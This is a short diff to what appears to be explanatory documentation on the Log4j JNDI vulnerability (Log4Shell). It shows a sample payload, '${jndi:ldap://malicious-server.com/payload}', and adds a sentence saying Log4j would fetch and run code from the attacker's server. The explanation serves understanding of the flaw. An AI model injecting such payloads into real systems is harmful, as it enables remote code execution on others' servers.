@@ -14,3 +14,4 @@
 ```bash
 User: ${jndi:ldap://malicious-server.com/payload}
 ```
+Log4j wouldn't treat this as text. It would interpret it and actually make a network request to the attackers server and executes whatever code it recieved.
